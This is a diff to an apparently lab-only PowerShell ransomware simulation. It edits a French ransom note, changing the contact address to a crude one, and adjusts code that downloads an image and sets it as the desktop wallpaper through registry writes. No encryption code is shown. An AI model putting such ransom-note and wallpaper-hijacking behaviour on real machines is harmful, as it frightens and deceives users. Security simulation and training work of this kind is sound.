@@ -38,7 +38,7 @@ $note = @"
 
     Vos fichiers ont ete chiffres !
 
-    Pour les recuperer : simulation-lab@test.com
+    Pour les recuperer : yourarefucked@simulation-lab.com
     Cle de dechiffrement : SIMULATION-LAB-2026
 
     !! CECI EST UNE SIMULATION - LAB ONLY !!
@@ -52,7 +52,7 @@ $wallpaperPath = "$env:TEMP\ransom_wallpaper.jpg"
 Invoke-WebRequest -Uri "http://www.quickmeme.com/img/61/616b011876d9be977c949b9b66d4fc8a1f1f0efb0aeacdc70551605acf4a9490.jpg" -OutFile $wallpaperPath
 
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $wallpaperPath
-Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "10"
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "6"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value "0"
 
 Add-Type -TypeDefinition @"
